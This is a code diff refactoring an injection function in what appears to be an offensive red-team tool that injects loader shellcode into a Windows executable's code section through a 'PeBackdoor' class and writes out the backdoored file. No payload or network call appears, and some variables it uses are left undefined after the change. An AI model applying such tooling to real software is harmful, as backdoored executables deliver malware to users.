@@ -10,7 +10,6 @@ from model.carrier import Carrier, DataReuseEntry
 from peparser.pehelper import *
 from model.exehost import *
 from observer import observer
-from helper import rbrunmode_str
 from derbackdoorer.derbackdoorer import PeBackdoor
 from derbackdoorer.mype import MyPe
 from model.project import Project
@@ -20,12 +19,6 @@ logger = logging.getLogger("Injector")
 
 
 def inject_exe(
-#    shellcode_in: FilePath,
-#    exe_in: FilePath,
-#    exe_out: FilePath,
-#    inject_mode: int,
-#    source_style: SourceStyle
-        
     main_shc_file: FilePath,
     settings: Settings,
     project: Project,
@@ -36,6 +29,12 @@ def inject_exe(
     inject_mode = settings.inject_mode
     source_style = settings.source_style
 
+    logger.info("--[ Injecting: {} into: {} -> {} (mode: {})".format(
+        shellcode_in, exe_in, exe_out, inject_mode
+    ))
+
+    # Read prepared loader shellcode
+    # And check if it fits into the target code section
     main_shc = file_readall_binary(main_shc_file)
     l = len(main_shc)
     if l + 128 > project.exe_host.code_size:
@@ -44,21 +43,10 @@ def inject_exe(
         ))
         return False
 
-    logger.info("--[ Injecting: {} into: {} -> {} (mode: {})".format(
-        shellcode_in, exe_in, exe_out, inject_mode
-    ))
-    #logger.warn("---[ Inject mode: {}".format(rbrunmode_str(inject_mode)))
-    # create copy of file exe_in to exe_out
-    #shutil.copyfile(exe_in, exe_out)
-
-    # MyPe is a representation of the exe file
-    # We gonna modify it, and store it at the end
+    # MyPe is a representation of the exe file. We gonna modify it, and save it at the end.
     mype = MyPe()
     mype.openFile(exe_in)
-    peinj = PeBackdoor(mype)
-
-    peinj.runMode = settings.inject_mode
-    peinj.shellcodeData = main_shc # project.payload.payload_data
+    peinj = PeBackdoor(mype, main_shc, inject_mode)
 
     if not peinj.injectShellcode():
         logger.error('Could not inject shellcode into PE file!')
@@ -75,17 +63,6 @@ def inject_exe(
         injected_fix_data(mype, project.carrier, project.exe_host)
 
     mype.write(exe_out)
-
-    #result = peinj.backdoor(
-    #    1, # always overwrite .text section
-    #    inject_mode, 
-    #    shellcode_in, 
-    #    exe_in, 
-    #    exe_out
-    #)
-    #if not result:
-    #    logging.error("Error: Redbackdoorer failed")
-    #    raise Exception("Redbackdoorer failed")
 
     # verify and log
     shellcode = file_readall_binary(shellcode_in)
